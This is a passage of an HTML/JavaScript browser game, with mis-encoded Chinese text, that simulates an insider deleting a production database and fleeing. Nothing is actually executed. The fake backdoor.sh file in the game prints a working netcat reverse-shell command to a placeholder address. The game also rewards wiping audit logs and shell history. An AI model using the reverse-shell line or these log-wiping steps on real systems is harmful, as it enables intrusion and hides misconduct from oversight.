                        printToScreen('ä½ æ·¡å®šåœ°è¯´ï¼š"ä»€ä¹ˆæ•°æ®ï¼Ÿæˆ‘åœ¨è€å®¶ç›¸äº²å‘¢ã€‚"');
                        triggerEnding('âœ¨ æˆåŠŸè·‘è·¯ï¼æ•°æ®æ²¡äº†ï¼Œæ—¥å¿—æ²¡äº†ï¼Œå®Œç¾ï¼\n\nã€ç»“å±€ï¼šè·‘è·¯æˆåŠŸ Â· Sçº§ã€‘', true);
                    } else if (auditFileDeleted) {
                        printToScreen('ğŸƒâ€â™‚ï¸ ä½ æ‹”è…¿å°±è·‘ï¼Œæ—¥å¿—åˆ äº†ä½†å†å²è¿˜åœ¨...');
                        printToScreen('è™½ç„¶è·‘äº†ï¼Œä½†æ€»æ„Ÿè§‰ä¸å®‰å¿ƒã€‚');
                        triggerEnding('âš ï¸ è·‘è·¯æˆåŠŸï¼Œä½†å†å²è®°å½•å¯èƒ½æš´éœ²ä½ ã€‚\n\nã€ç»“å±€ï¼šè·‘è·¯æˆåŠŸ Â· Açº§ã€‘', true);
                    } else {
                        printToScreen('ğŸƒâ€â™‚ï¸ ä½ æ‹”è…¿å°±è·‘ï¼Œä½†å¿˜äº†åˆ å®¡è®¡æ—¥å¿—...');
                        printToScreen('ä¸€å‘¨åï¼Œè­¦å¯Ÿæ ¹æ®æ—¥å¿—è®°å½•æ‰¾åˆ°ä½ ã€‚');
                        triggerEnding('ğŸš” ä½ è·‘å›å®¶äº†ï¼Œä½†ä¸‰å¤©åè­¦å¯Ÿä¸Šé—¨ã€‚\n\nã€ç»“å±€ï¼šè·‘è·¯å¤±è´¥ Â· è¯æ®æœªæ¶ˆã€‘');
                    }
                } else {
                    printToScreen('ğŸƒâ€â™‚ï¸ ä½ è·‘è·¯äº†ï¼Œä½†æ•°æ®è¿˜åœ¨...');
                    printToScreen('è¿™ç®—ä»€ä¹ˆåˆ åº“è·‘è·¯ï¼Ÿ');
                    triggerEnding('ğŸ¤” ä½ ä»€ä¹ˆéƒ½æ²¡å¹²å°±è·‘äº†ï¼Œè€æ¿æ‰£äº†ä½ ä¸€ä¸ªæœˆå·¥èµ„ã€‚\n\nã€ç»“å±€ï¼šæ‡¦å¤«ã€‘');
                }
                return;
            }
            
            // éšè”½é™é£é™©
            if (baseCmd === 'hide' || baseCmd === 'éšè”½') {
                if (hideCount >= 3) {
                    printToScreen('ä½ å·²ç»èº²å¤ªå¤šæ¬¡äº†ï¼Œæœºæˆ¿æ²¡æœ‰å…¶ä»–åœ°æ–¹å¯è—ï¼');
                } else {
                    hideCount++;
                    printToScreen('ğŸ‘» ä½ èº²åœ¨æœºæˆ¿çš„æœåŠ¡å™¨åé¢ï¼Œå±ä½å‘¼å¸...');
                    printToScreen('å®¡è®¡äººå‘˜ä»ä½ èº«è¾¹èµ°è¿‡ï¼Œæ²¡æœ‰å‘ç°ä½ ï¼é£é™©é™ä½äº†ï¼');
                    updateRisk(risk - 15);
                    printToScreen(`(éšè”½æ¬¡æ•°å‰©ä½™: ${3 - hideCount})`);
                    
                    if (hideCount === 3) {
                        unlockAchievement('hide_master');
                    }
                }
                return;
            }

            // åé—¨å½©è›‹åç»­å‰§æƒ…
            if (baseCmd === 'continue_backdoor') {
                if (!backdoorEasterEggTriggered) {
                    printToScreen('ä½ è¿˜æœªè§¦å‘åé—¨å½©è›‹ï¼Œè¯·å…ˆæ‰§è¡Œ ./backdoor.sh');
                } else {
                    printToScreen('ğŸ•³ï¸ ä½ é€‰æ‹©ç»§ç»­é€šè¿‡åé—¨æ“ä½œ...');
                    printToScreen('åå‘è¿æ¥å»ºç«‹ï¼Œä½†ä½ è§¦å‘äº†æ›´é«˜çº§åˆ«çš„å…¥ä¾µæ£€æµ‹ï¼');
                    printToScreen('ç³»ç»Ÿç®¡ç†å‘˜ï¼š "æ£€æµ‹åˆ°å¼‚å¸¸å‡ºç«™æµé‡ï¼Œç«‹å³åˆ‡æ–­è¿æ¥ï¼"');
                    updateRisk(risk + 30);
                    backdoorChoice = 'continue';
                    unlockAchievement('backdoor_continue');
                    
                    if (risk >= 100) {
                        triggerEnding('ğŸš¨ ä½ è¢«ç½‘ç»œè­¦å¯Ÿé”å®šIPåœ°å€ï¼ŒåŠå°æ—¶ååœ¨ç½‘å§è¢«æ•ã€‚\n\nã€ç»“å±€ï¼šåé—¨é€ƒäº¡å¤±è´¥ã€‘');
                    } else {
                        printToScreen('âš ï¸ ä½ ä¾¥å¹¸é€ƒè„±ï¼Œä½†é£é™©å·²ç»æé«˜ï¼');
                    }
                }
                return;
            }
            
            if (baseCmd === 'cut_backdoor') {
                if (!backdoorEasterEggTriggered) {
                    printToScreen('ä½ è¿˜æœªè§¦å‘åé—¨å½©è›‹ï¼Œè¯·å…ˆæ‰§è¡Œ ./backdoor.sh');
                } else {
                    printToScreen('ğŸ”Œ ä½ æœæ–­åˆ‡æ–­åé—¨è¿æ¥ï¼Œå°±åœ°éšè—...');
                    printToScreen('ä½ èº²åœ¨æœºæˆ¿çš„æœåŠ¡å™¨åé¢ï¼Œç­‰å®¡è®¡äººå‘˜ç¦»å¼€åæ‰æ‚„æ‚„æºœèµ°ã€‚');
                    printToScreen('è™½ç„¶æ•°æ®åˆ äº†ï¼Œä½†æ²¡äººå‘ç°æ˜¯ä½ å¹²çš„ï¼');
                    updateRisk(risk - 20);
                    backdoorChoice = 'cut';
                    unlockAchievement('backdoor_cut');
                    
                    if (risk < 0) risk = 0;
                    
                    printToScreen('âœ… é£é™©é™ä½äº†ï¼ç°åœ¨å¯ä»¥å®‰å…¨è·‘è·¯äº†ï¼');
                }
                return;
            }

            // help 
            if (baseCmd === 'help' || baseCmd === 'ï¼Ÿ' || baseCmd === '?') {
                printToScreen('å¯ç”¨å‘½ä»¤:');
                printToScreen('  ls [-la]              æŸ¥çœ‹å½“å‰ç›®å½•');
                printToScreen('  cat <file>            æŸ¥çœ‹æ–‡ä»¶');
                printToScreen('  rm -rf <dir>          åˆ é™¤ç›®å½•');
                printToScreen('  rm -f <file>          åˆ é™¤æ–‡ä»¶');
                printToScreen('  sudo su               å°è¯•ææƒ');
                printToScreen('  ./backdoor.sh         æ‰§è¡Œåé—¨è„šæœ¬');
                printToScreen('  history               æ˜¾ç¤ºè¾“å…¥å†å²');
                printToScreen('  history -c            æ¸…ç©ºå†å²è®°å½•');
                printToScreen('  clear                 æ¸…å±');
                printToScreen('  hide                   éšè”½ï¼ˆé™ä½é£é™©ï¼‰');
                printToScreen('  run / escape           è·‘è·¯ï¼æå‰ç»“æŸæ¸¸æˆ');
                printToScreen('  achievements           æŸ¥çœ‹æˆå°±');
                printToScreen('  [å…¶ä»–] ä¼šè§¦å‘æœªçŸ¥é£é™©');
                updateRisk(risk + 2);
            }

            // ls 
            else if (baseCmd === 'ls') {
                let option = parts[1] || '';
                if (option === '-la' || option === '-l') {
                    let fileList = 'total 64\n';
                    fileList += 'drwxr-x---  7 root  root    4096 Feb 24 13:37 .\n';
                    fileList += 'drwxr-x---  7 root  root    4096 Feb 24 13:37 ..\n';
                    fileList += '-rw-r--r--  1 db    db      1223 Feb 24 13:20 config.json\n';
                    fileList += '-rw-------  1 db    db     32768 Feb 24 13:35 secret.db\n';
                    
                    if (!dataDeleted) {
                        fileList += 'drwx------  2 db    db      4096 Feb 23 09:12 data\n';
                    }
                    
                    fileList += '-rwxr-xr-x  1 db    db       214 Feb 24 12:44 backdoor.sh\n';
                    
                    if (!auditFileDeleted) {
                        fileList += '--w-------  1 root  root       6 Feb 24 10:05 .hidden_audit\n';
                    }
                    
                    printToScreen(fileList);
                    updateRisk(risk + 1);
                } else {
                    let fileList = 'config.json  secret.db  ';
                    if (!dataDeleted) fileList += 'data  ';
                    fileList += 'backdoor.sh';
                    printToScreen(fileList);
                    updateRisk(risk + 0);
                }
            }

            // cat 
            else if (baseCmd === 'cat') {
                if (parts.length < 2) {
                    printToScreen('ç”¨æ³•: cat <æ–‡ä»¶å>');
                } else {
                    const file = parts[1];
                    if (file === 'config.json') {
                        printToScreen('{ "database": "production", "host": "10.0.0.1", "user": "app_user", "password": "â˜…secretâ˜…" }');
                        updateRisk(risk + 5);
                        unlockAchievement('cat_config');
                    } else if (file === 'secret.db') {
                        printToScreen('ï¿½ äºŒè¿›åˆ¶æ•°æ®ä¹±ç  ... ä¼¼ä¹åŒ…å«ç”¨æˆ·å¯†é’¥ã€‚');
                        printToScreen('æç¤º: éœ€è¦è§£å¯†å·¥å…·ï¼Œä½†ä½ æ€¥ç€è·‘è·¯æ²¡ç©ºçœ‹ã€‚');
                        updateRisk(risk + 3);
                        unlockAchievement('cat_secret');
                    } else if (file === 'backdoor.sh') {
                        printToScreen('#!/bin/bash');
                        printToScreen('echo "Connecting to C2 server..."');
                        printToScreen('nc -e /bin/bash 203.0.113.99 4444 &');
                        printToScreen('# è®°å¾—æ¸…ç†æ—¥å¿—');
                        updateRisk(risk + 8);
                        unlockAchievement('cat_backdoor');
                    } else if (file === '.hidden_audit' || file === 'hidden_audit') {
                        if (auditFileDeleted) {
                            printToScreen(`cat: ${file}: No such file or directory`);
                        } else {
                            printToScreen('Feb 24 13:37:21 [audit] user=db command="rm -rf ./data" status=SUCCESS\nFeb 24 13:38:15 [audit] user=db command="sudo su" status=SUCCESS');
                            printToScreen('âš ï¸  è¿™æ˜¯å®¡è®¡æ—¥å¿—ï¼è®°å½•äº†ä½ çš„æ‰€æœ‰æ“ä½œï¼');
                            updateRisk(risk + 1);
                        }
                    } else {
                        printToScreen(`cat: ${file}: No such file or directory`);
                        updateRisk(risk + 1);
                    }
                }
            }

            // rm -rf æ ¸å¿ƒæ“ä½œ
            else if (baseCmd === 'rm' && parts[1] === '-rf' && parts.length >= 3) {
                const target = parts[2];
                if (target === './data' || target === 'data' || target === '/data/production/db/data') {
                    if (dataDeleted) {
                        printToScreen('rm: ç›®å½• data å·²ç»ä¸å­˜åœ¨äº†ã€‚ä½ è¿˜æƒ³åˆ ä»€ä¹ˆï¼Ÿ');
                        updateRisk(risk + 3);
                    } else {
                        printToScreen('âš ï¸  æ­£åœ¨é€’å½’åˆ é™¤ data ç›®å½•...');
                        printToScreen('ğŸ§¾ åˆ é™¤ 128 ä¸ªè¡¨ï¼Œ 3.2GB æ•°æ® ... å®Œæˆ');
                        printToScreen('ğŸ’€ æ ¸å¿ƒæ•°æ®å·²åˆ é™¤ï¼ ä½†æ“ä½œæ—¥å¿—å·²è¢«è®°å½•ã€‚');
                        dataDeleted = true;
                        updateRisk(risk + 25);
                        unlockAchievement('data_deleted');
                    }
                } else if (target === '/' || target === '/*') {
                    printToScreen('å“ˆå“ˆï¼Œæƒ³åˆ æ ¹ï¼Ÿæƒé™ä¸è¶³ï¼ˆè€Œä¸”è¿™å¤ªæ˜æ˜¾äº†ï¼‰ã€‚åªåˆ äº† home ç›®å½•ä¸‹å‡ ä¸ªæ–‡ä»¶ã€‚');
                    updateRisk(risk + 40);
                    unlockAchievement('rm_root');
                } else {
                    printToScreen(`rm: æ— æ³•åˆ é™¤ '${target}'ï¼Œæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚`);
                    updateRisk(risk + 2);
                }
            }
            
            // rm -f åˆ é™¤å•ä¸ªæ–‡ä»¶
            else if (baseCmd === 'rm' && parts[1] === '-f' && parts.length >= 3) {
                const target = parts[2];
                if (target === '.hidden_audit' || target === './.hidden_audit' || target === 'hidden_audit') {
                    if (auditFileDeleted) {
                        printToScreen('rm: å®¡è®¡æ—¥å¿—æ–‡ä»¶å·²ä¸å­˜åœ¨ã€‚');
                    } else {
                        printToScreen('âœ… å®¡è®¡æ—¥å¿—æ–‡ä»¶å·²åˆ é™¤ï¼ç°åœ¨æ²¡æœ‰æ“ä½œè®°å½•äº†ï¼');
                        auditFileDeleted = true;
                        updateRisk(risk + 20);
                        unlockAchievement('audit_clean');
                    }
                } else if (target === '.bash_history' || target === '~/.bash_history') {
                    printToScreen('âœ… å‘½ä»¤å†å²æ–‡ä»¶å·²æ¸…ç©º');
                    bashHistoryCleared = true;
                    updateRisk(risk + 5);
                    unlockAchievement('history_clean');
                } else {
                    printToScreen(`rm: æ— æ³•åˆ é™¤ '${target}'ï¼Œæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚`);
                    updateRisk(risk + 2);
                }
            }

            // sudo su
            else if (baseCmd === 'sudo' && parts[1] === 'su') {
                if (sudoObtained) {
                    printToScreen('å·²ç»å¤„äº root æƒé™ã€‚');
                } else {
                    printToScreen('[sudo] password for db: ');
                    printToScreen('å¯¹ä¸èµ·ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚');
                    printToScreen('âš ï¸ ç¬¬äºŒæ¬¡å°è¯•æˆåŠŸ... æ‚¨ç°åœ¨æ˜¯ root (ä½†è®¤è¯æ—¥å¿—å¤šäº†ä¸¤æ¡è®°å½•)');
                    sudoObtained = true;
                    updateRisk(risk + 20);
                    unlockAchievement('sudo_root');
                }
            }

            // åé—¨å‘½ä»¤
            else if (baseCmd === './backdoor.sh' || (baseCmd === 'bash' && parts[1] === 'backdoor.sh')) {
                if (!sudoObtained) {
                    printToScreen('bash: ./backdoor.sh: æƒé™ä¸å¤Ÿ (è¯·å…ˆä½¿ç”¨ sudo su)');
                    updateRisk(risk + 5);
                } else {
                    printToScreen('ğŸ•³ï¸ åé—¨å·²æ‰§è¡Œï¼šåå‘ shell è¿æ¥è‡³ 203.0.113.99:4444');
                    printToScreen('ä½†å‡ºç«™æµé‡è§¦å‘äº† ids å‘Šè­¦ï¼Œå®¡è®¡é£é™©é£™å‡ï¼');
                    secretBackdoorUsed = true;
                    updateRisk(risk + 25);
                    unlockAchievement('backdoor_used');
                    
                    // è§¦å‘åé—¨å½©è›‹
                    if (dataDeleted && !backdoorEasterEggTriggered) {
                        triggerBackdoorEasterEgg();
                    } else if (!backdoorEasterEggTriggered) {
                        printToScreen('(åé—¨å»ºç«‹äº†è¿æ¥ï¼Œä½†ä½ éœ€è¦å…ˆåˆ åº“æ‰èƒ½è§¦å‘å®Œæ•´å‰§æƒ…...)');
                    }
                }
            }

            // history å’Œ history -c
            else if (baseCmd === 'history') {
                if (parts[1] === '-c') {
                    printToScreen('âœ… å‘½ä»¤å†å²å·²ä»å†…å­˜ä¸­æ¸…ç©º');
                    commandHistory = [];
                    bashHistoryCleared = true;
                    updateRisk(risk + 1);
                    unlockAchievement('history_clean');
                } else {
                    if (commandHistory.length === 0) {
                        printToScreen('å†å²ä¸ºç©º');
                    } else {
                        commandHistory.forEach((comm, idx) => {
                            printToScreen(`  ${idx+1}  ${comm}`);
                        });
                    }
                    updateRisk(risk + 1);
                }
            }

            // æ¸…ç©ºå†å²æ–‡ä»¶
            else if (baseCmd === '>' && parts[1] === '~/.bash_history') {
                printToScreen('âœ… .bash_history æ–‡ä»¶å·²æ¸…ç©º');
                bashHistoryCleared = true;
                updateRisk(risk + 5);
                unlockAchievement('history_clean');
            }

            // clear
            else if (baseCmd === 'clear') {
                outputEl.innerHTML = '--- å±å¹•å·²æ¸…ç©º ---\nå½“å‰é£é™©: ' + risk + '%  æ—¶é—´å‰©ä½™: ' + timerSpan.innerText;
                printToScreen('> è¾“å…¥ç»§ç»­ä½ çš„æ“ä½œ...');
            }

            // exit
            else if (baseCmd === 'exit') {
                printToScreen('è¿æ¥å·²é”å®šï¼Œæ— æ³•é€€å‡ºã€‚ä½ åªèƒ½ç»§ç»­æç ´åæˆ–è€…ç­‰å¾…å®¡è®¡ã€‚');
                printToScreen('æç¤º: æƒ³è·‘è·¯è¯·ç”¨ run å‘½ä»¤');
                updateRisk(risk + 5);
            }

            // å…¶ä»–æœªçŸ¥å‘½ä»¤
            else {
                printToScreen(`å‘½ä»¤æœªæ‰¾åˆ°: ${baseCmd}ï¼Œå°è¯•è¾“å…¥ help`);
                updateRisk(risk + 4);
            }

            checkFailureCondition();
            
            // é¦–æ¬¡å‘½ä»¤è§£é”æˆå°±
            if (commandHistory.length === 1 && !ACHIEVEMENTS.find(a => a.id === 'first_timer').unlocked) {
                unlockAchievement('first_timer');
            }
        }

        // å€’è®¡æ—¶
        function startTimer() {
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                if (gameOver) return;
                if (timeLeft > 0) {
                    timeLeft -= 1;
                    updateTimerDisplay();
                    
                    // æ¯30ç§’è‡ªåŠ¨å¢åŠ é£é™©
                    if (timeLeft % 30 === 0 && timeLeft > 0) {
                        updateRisk(risk + 2);
                        printToScreen(`â° æ—¶é—´æµé€ï¼Œé£é™©å¢åŠ äº†... (å½“å‰ ${risk}%)`);
                    }
                    
                    checkFailureCondition();
                } else {
                    triggerEnding();
                }
            }, 1000);
        }

        // é‡ç½®æ¸¸æˆ
        function resetGame() {
            risk = 15;
            timeLeft = 300;
            gameOver = false;
            finalMessageShown = false;
            secretBackdoorUsed = false;
            sudoObtained = false;
            dataDeleted = false;
            auditFileDeleted = false;
            bashHistoryCleared = false;
            backdoorEasterEggTriggered = false;
            backdoorChoice = null;
            hideCount = 0;
            highRiskWarningShown = false;
            commandHistory = [];

            inputEl.disabled = false;
            inputEl.value = '';
            inputEl.placeholder = 'è¾“å…¥å‘½ä»¤ (help / run / hide)';
            updateRisk(risk);
            updateTimerDisplay();
            resetScreenWithWelcome();

            if (timerInterval) clearInterval(timerInterval);
            startTimer();
            
            // åˆ·æ–°æˆå°±æ˜¾ç¤º
            updateAchievementDisplay();
        }

        // äº‹ä»¶ç»‘å®š
        inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = inputEl.value.trim();
                if (cmd !== '' && !gameOver) {
                    processCommand(cmd);
                } else if (gameOver) {
                    printToScreen('æ¸¸æˆå·²ç»“æŸï¼Œè¯·æŒ‰é‡ç½®ã€‚');
                }
                inputEl.value = '';
            }
        });

        document.querySelectorAll('.cmd-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const cmd = btn.getAttribute('data-cmd');
                if (!gameOver) {
                    processCommand(cmd);
                } else {
                    printToScreen('æ¸¸æˆå·²ç»“æŸï¼Œè¯·æŒ‰é‡ç½®ã€‚');
                }
                inputEl.value = '';
                inputEl.focus();
            });
        });

        resetBtn.addEventListener('click', () => {
            resetGame();
            inputEl.focus();
        });
        
        clearAchievementsBtn.addEventListener('click', () => {
            clearAchievements();
        });

        // æˆå°±é¢æ¿æŠ˜å 
        window.toggleAchievements = function() {
            const content = document.getElementById('achievementContent');
            const icon = document.getElementById('toggleIcon');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                icon.innerText = 'â–¼';
            } else {
                content.style.display = 'none';
                icon.innerText = 'â–¶';
            }
        };

        // åˆå§‹åŒ–
        loadAchievements();
        resetGame();
        inputEl.focus();
        
        // é¦–æ¬¡æ˜¾ç¤ºæˆå°±
        updateAchievementDisplay();
    })();
</script>
</body>
</html>
